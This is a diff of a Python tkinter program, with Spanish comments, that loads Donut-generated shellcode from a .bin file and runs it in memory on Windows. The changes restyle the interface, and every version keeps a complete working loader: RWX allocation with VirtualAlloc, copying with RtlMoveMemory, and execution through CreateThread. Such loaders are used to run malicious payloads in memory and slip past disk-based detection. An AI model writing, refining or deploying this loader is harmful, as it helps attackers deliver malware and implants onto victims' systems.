@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
-# ShellcodeLoaderGUI - Carga y ejecuta shellcode .bin (Donut) en memoria
+# shell_gui.py - Interfaz gráfica para ejecutar shellcode .bin (Donut)
 import tkinter as tk
 from tkinter import filedialog, messagebox, scrolledtext
-import threading
 import ctypes
 from ctypes import wintypes
+import threading
 import os
 import sys
 
@@ -14,140 +14,124 @@ MEM_RESERVE = 0x00002000
 PAGE_EXECUTE_READWRITE = 0x40
 INFINITE = 0xFFFFFFFF
 
-class ShellcodeLoaderApp:
+class ShellcodeExecutor:
     def __init__(self, root):
         self.root = root
-        self.root.title("Shellcode Loader v1.0 - Donut .bin Executor")
+        self.root.title("Shellcode Executor v1.0")
         self.root.geometry("600x500")
         self.root.resizable(True, True)
+        self.root.configure(bg='#1e1e1e')
         
-        # Icono opcional (si tienes .ico)
-        # self.root.iconbitmap("icon.ico")
+        # Variables
+        self.bin_path = tk.StringVar()
         
-        # Estilos y colores
-        self.root.configure(bg='#2c3e50')
-        self.font_title = ('Segoe UI', 12, 'bold')
-        self.font_normal = ('Segoe UI', 10)
+        # Estilos
+        self.fg_color = '#d4d4d4'
+        self.bg_color = '#1e1e1e'
+        self.btn_bg = '#0e639c'
+        self.btn_fg = '#ffffff'
+        self.entry_bg = '#2d2d2d'
         
-        self.create_widgets()
+        self.setup_ui()
         
-    def create_widgets(self):
+    def setup_ui(self):
         # Frame principal
-        main_frame = tk.Frame(self.root, bg='#2c3e50')
+        main_frame = tk.Frame(self.root, bg=self.bg_color)
         main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
         
         # Título
-        title = tk.Label(main_frame, text="Shellcode Executor (Donut .bin)", 
-                         font=('Segoe UI', 16, 'bold'), fg='#ecf0f1', bg='#2c3e50')
+        title = tk.Label(main_frame, text="Shellcode Loader", font=('Segoe UI', 16, 'bold'),
+                         fg='#4ec9b0', bg=self.bg_color)
         title.pack(pady=(0, 20))
         
         # Frame para selección de archivo
-        file_frame = tk.Frame(main_frame, bg='#34495e', relief=tk.GROOVE, bd=2)
-        file_frame.pack(fill=tk.X, pady=10)
+        file_frame = tk.Frame(main_frame, bg=self.bg_color)
+        file_frame.pack(fill=tk.X, pady=5)
         
-        self.file_path_var = tk.StringVar()
-        tk.Label(file_frame, text="Archivo .bin:", font=self.font_normal, 
-                 bg='#34495e', fg='white').pack(side=tk.LEFT, padx=10, pady=10)
-        tk.Entry(file_frame, textvariable=self.file_path_var, width=40, 
-                 font=self.font_normal).pack(side=tk.LEFT, padx=5, pady=10, fill=tk.X, expand=True)
-        tk.Button(file_frame, text="Examinar", command=self.browse_file, 
-                  bg='#3498db', fg='white', font=self.font_normal, 
-                  activebackground='#2980b9').pack(side=tk.RIGHT, padx=10, pady=10)
+        lbl_file = tk.Label(file_frame, text="Archivo .bin:", font=('Segoe UI', 10),
+                            fg=self.fg_color, bg=self.bg_color)
+        lbl_file.pack(side=tk.LEFT, padx=(0, 10))
         
-        # Frame para botones de acción
-        btn_frame = tk.Frame(main_frame, bg='#2c3e50')
-        btn_frame.pack(fill=tk.X, pady=20)
+        self.entry_file = tk.Entry(file_frame, textvariable=self.bin_path, font=('Segoe UI', 10),
+                                   bg=self.entry_bg, fg=self.fg_color, insertbackground='white')
+        self.entry_file.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
         
-        self.execute_btn = tk.Button(btn_frame, text="▶ EJECUTAR SHELLCODE", 
-                                     command=self.execute_shellcode_thread,
-                                     bg='#27ae60', fg='white', font=self.font_title,
-                                     activebackground='#2ecc71', padx=20, pady=8)
-        self.execute_btn.pack(side=tk.LEFT, padx=10)
+        btn_browse = tk.Button(file_frame, text="Examinar", command=self.browse_file,
+                               bg=self.btn_bg, fg=self.btn_fg, font=('Segoe UI', 9),
+                               padx=10, pady=2, cursor='hand2')
+        btn_browse.pack(side=tk.RIGHT)
         
-        self.clear_btn = tk.Button(btn_frame, text="CLEAR LOG", 
-                                   command=self.clear_log,
-                                   bg='#e67e22', fg='white', font=self.font_normal,
-                                   activebackground='#f39c12', padx=15, pady=5)
-        self.clear_btn.pack(side=tk.LEFT, padx=10)
+        # Botón ejecutar
+        self.btn_execute = tk.Button(main_frame, text="EJECUTAR SHELLCODE", command=self.execute_shellcode,
+                                     bg='#2d2d2d', fg='#4ec9b0', font=('Segoe UI', 11, 'bold'),
+                                     padx=20, pady=8, cursor='hand2', borderwidth=1, relief=tk.RAISED)
+        self.btn_execute.pack(pady=20)
         
-        # Área de log (texto con scroll)
-        log_frame = tk.Frame(main_frame, bg='#2c3e50')
-        log_frame.pack(fill=tk.BOTH, expand=True, pady=10)
+        # Área de logs
+        log_frame = tk.LabelFrame(main_frame, text="Registro de eventos", font=('Segoe UI', 9, 'bold'),
+                                  fg=self.fg_color, bg=self.bg_color, bd=1, relief=tk.SUNKEN)
+        log_frame.pack(fill=tk.BOTH, expand=True)
         
-        tk.Label(log_frame, text="Consola de ejecución:", font=self.font_normal, 
-                 fg='white', bg='#2c3e50', anchor='w').pack(fill=tk.X)
+        self.log_area = scrolledtext.ScrolledText(log_frame, height=12, font=('Consolas', 9),
+                                                   bg='#1e1e1e', fg='#d4d4d4', insertbackground='white',
+                                                   wrap=tk.WORD, borderwidth=0)
+        self.log_area.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
         
-        self.log_text = scrolledtext.ScrolledText(log_frame, height=15, 
-                                                   bg='#ecf0f1', fg='#2c3e50',
-                                                   font=('Consolas', 9), wrap=tk.WORD)
-        self.log_text.pack(fill=tk.BOTH, expand=True, pady=(5,0))
+        # Configurar colores de tags para logs
+        self.log_area.tag_config('info', foreground='#4ec9b0')
+        self.log_area.tag_config('error', foreground='#f48771')
+        self.log_area.tag_config('success', foreground='#6a9955')
         
-        # Estado en barra inferior
-        self.status_var = tk.StringVar()
-        self.status_var.set("Listo. Selecciona un archivo .bin")
-        status_bar = tk.Label(self.root, textvariable=self.status_var, 
-                              bd=1, relief=tk.SUNKEN, anchor=tk.W,
-                              bg='#34495e', fg='white', font=('Segoe UI', 9))
-        status_bar.pack(side=tk.BOTTOM, fill=tk.X)
-        
-    def log(self, message, is_error=False):
-        """Agrega mensaje al área de log con color opcional"""
-        self.log_text.insert(tk.END, message + "\n")
-        if is_error:
-            # Marcar error en rojo
-            start = self.log_text.index(tk.END + "-1l linestart")
-            end = self.log_text.index(tk.END + "-1l lineend")
-            self.log_text.tag_add("error", start, end)
-            self.log_text.tag_config("error", foreground="red")
-        self.log_text.see(tk.END)
+        # Estado inicial
+        self.log("Inicializado. Seleccione un archivo .bin generado con Donut.", 'info')
+    
+    def log(self, message, tag='info'):
+        """Añadir mensaje al área de logs"""
+        self.log_area.insert(tk.END, f"[*] {message}\n", tag)
+        self.log_area.see(tk.END)
         self.root.update_idletasks()
-        
-    def clear_log(self):
-        self.log_text.delete(1.0, tk.END)
-        self.log("Log limpiado.")
-        
+    
     def browse_file(self):
+        """Abrir diálogo para seleccionar archivo .bin"""
         filename = filedialog.askopenfilename(
             title="Seleccionar archivo .bin",
-            filetypes=[("Binarios Donut", "*.bin"), ("Todos los archivos", "*.*")]
+            filetypes=[("Binarios shellcode", "*.bin"), ("Todos los archivos", "*.*")]
         )
         if filename:
-            self.file_path_var.set(filename)
-            self.log(f"Archivo seleccionado: {filename}")
-            self.status_var.set(f"Archivo: {os.path.basename(filename)}")
-            
-    def execute_shellcode_thread(self):
-        """Inicia la ejecución en un hilo separado para no bloquear la GUI"""
-        threading.Thread(target=self.execute_shellcode, daemon=True).start()
-        
+            self.bin_path.set(filename)
+            self.log(f"Archivo seleccionado: {filename}", 'info')
+    
     def execute_shellcode(self):
-        bin_path = self.file_path_var.get().strip()
-        if not bin_path:
-            messagebox.showwarning("Sin archivo", "Por favor selecciona un archivo .bin")
+        """Ejecutar el shellcode en un hilo separado"""
+        path = self.bin_path.get().strip()
+        if not path:
+            messagebox.showerror("Error", "Por favor, seleccione un archivo .bin")
             return
-        if not os.path.exists(bin_path):
-            messagebox.showerror("Error", "El archivo no existe")
+        if not os.path.exists(path):
+            messagebox.showerror("Error", f"El archivo no existe:\n{path}")
             return
-            
-        # Deshabilitar botón durante ejecución
-        self.execute_btn.config(state=tk.DISABLED, text="EJECUTANDO...")
-        self.log("="*50)
-        self.log(f"Iniciando carga de shellcode: {bin_path}")
         
+        # Deshabilitar botón durante la ejecución
+        self.btn_execute.config(state=tk.DISABLED)
+        self.log("Iniciando ejecución del shellcode...", 'info')
+        
+        # Ejecutar en otro hilo para no bloquear la GUI
+        thread = threading.Thread(target=self._inject_and_run, args=(path,), daemon=True)
+        thread.start()
+    
+    def _inject_and_run(self, path):
+        """Función que realiza la inyección (corre en hilo separado)"""
         try:
-            # Leer el .bin
-            with open(bin_path, "rb") as f:
+            # 1. Leer el archivo .bin
+            with open(path, "rb") as f:
                 shellcode = f.read()
             if not shellcode:
-                self.log("ERROR: El archivo está vacío", is_error=True)
+                self.log("El archivo está vacío", 'error')
+                self._enable_button()
                 return
-            self.log(f"[+] Shellcode cargado: {len(shellcode)} bytes")
+            self.log(f"Shellcode cargado: {len(shellcode)} bytes", 'success')
             
-            # Verificar arquitectura del Python
-            arch = 'x64' if sys.maxsize > 2**32 else 'x86'
-            self.log(f"[*] Python corriendo en modo {arch}")
-            
-            # Cargar APIs de Windows
+            # 2. Cargar DLLs
             kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
             ntdll = ctypes.WinDLL("ntdll", use_last_error=True)
             
@@ -159,49 +143,46 @@ class ShellcodeLoaderApp:
             kernel32.CreateThread.restype = wintypes.HANDLE
             kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
             
-            # 1. Reservar memoria ejecutable
-            self.log("[*] Reservando memoria con VirtualAlloc (RWX)...")
+            # 3. Reservar memoria RWX
             ptr = kernel32.VirtualAlloc(None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
             if not ptr:
                 err = ctypes.get_last_error()
-                self.log(f"[-] VirtualAlloc falló. Error: {err} (0x{err:08X})", is_error=True)
+                self.log(f"VirtualAlloc falló. Error: {err} (0x{err:08X})", 'error')
+                self._enable_button()
                 return
-            self.log(f"[*] Memoria reservada en: {hex(ptr)}")
+            self.log(f"Memoria reservada en: {hex(ptr)}", 'info')
             
-            # 2. Copiar shellcode
-            self.log("[*] Copiando shellcode a memoria...")
+            # 4. Copiar shellcode con RtlMoveMemory
             ntdll.RtlMoveMemory(ptr, shellcode, len(shellcode))
-            self.log("[+] Shellcode copiado correctamente")
+            self.log("Shellcode copiado a memoria", 'success')
             
-            # 3. Crear hilo para ejecutar
-            self.log("[*] Creando hilo de ejecución...")
+            # 5. Crear hilo de ejecución
             thread_id = wintypes.DWORD()
             h_thread = kernel32.CreateThread(None, 0, ptr, None, 0, ctypes.byref(thread_id))
             if not h_thread:
                 err = ctypes.get_last_error()
                 kernel32.VirtualFree(ptr, 0, 0x8000)
-                self.log(f"[-] CreateThread falló. Error: {err} (0x{err:08X})", is_error=True)
+                self.log(f"CreateThread falló. Error: {err} (0x{err:08X})", 'error')
+                self._enable_button()
                 return
-                
-            self.log(f"[+] Shellcode ejecutándose en hilo ID: {thread_id.value}")
-            self.log("[*] Esperando a que el shellcode termine (puede que nunca termine si es persistente)...")
-            self.status_var.set("Shellcode en ejecución...")
             
-            # Opcional: esperar un tiempo o esperar indefinidamente (puede bloquear si el shellcode no termina)
-            # Para no congelar la GUI, esperamos en el hilo secundario.
+            self.log(f"Shellcode ejecutándose en hilo ID: {thread_id.value}", 'success')
+            messagebox.showinfo("Éxito", f"Shellcode inyectado correctamente.\nHilo ID: {thread_id.value}")
+            
+            # Esperar a que termine (opcional, evita que se cierre la GUI)
             kernel32.WaitForSingleObject(h_thread, INFINITE)
             kernel32.CloseHandle(h_thread)
-            self.log("[+] Hilo de shellcode finalizado.")
-            self.status_var.set("Ejecución completada.")
             
         except Exception as e:
-            self.log(f"[-] Excepción: {e}", is_error=True)
-            self.status_var.set("Error en ejecución")
+            self.log(f"Excepción: {str(e)}", 'error')
         finally:
-            self.execute_btn.config(state=tk.NORMAL, text="▶ EJECUTAR SHELLCODE")
-            self.log("="*50 + "\n")
+            self._enable_button()
+    
+    def _enable_button(self):
+        """Reactivar botón desde el hilo principal"""
+        self.root.after(0, lambda: self.btn_execute.config(state=tk.NORMAL))
 
 if __name__ == "__main__":
     root = tk.Tk()
-    app = ShellcodeLoaderApp(root)
+    app = ShellcodeExecutor(root)
     root.mainloop()
